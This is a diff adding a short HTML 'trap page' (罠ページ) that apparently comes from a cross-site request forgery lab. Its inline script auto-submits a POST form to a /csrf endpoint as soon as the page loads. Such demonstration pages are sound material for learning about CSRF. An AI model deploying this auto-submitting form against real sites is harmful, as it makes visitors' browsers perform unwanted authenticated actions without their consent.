@@ -1,0 +1,16 @@
+<!DOCTYPE html>   
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+</head>
+
+<body>
+  <h1>罠ページ</h1>
+  <form action="/csrf" method="post">
+    <input type="submit" />
+  </form>
+  <script>
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
